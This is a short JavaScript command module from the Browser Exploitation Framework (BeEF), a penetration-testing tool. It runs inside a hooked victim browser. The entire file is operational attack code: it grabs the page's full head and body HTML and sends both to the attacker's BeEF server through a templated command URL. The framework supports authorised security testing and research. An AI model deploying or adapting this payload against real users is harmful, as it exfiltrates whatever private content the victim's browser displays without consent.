//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var head = beef.browser.getPageHead();
	var body = beef.browser.getPageBody();
	var mod_data = 'head=' + head + '&body=' + body;
	beef.net.send("<%= @command_url %>", <%= @command_id %>, mod_data, beef.are.status_success());
	return [beef.are.status_success(), mod_data];
});

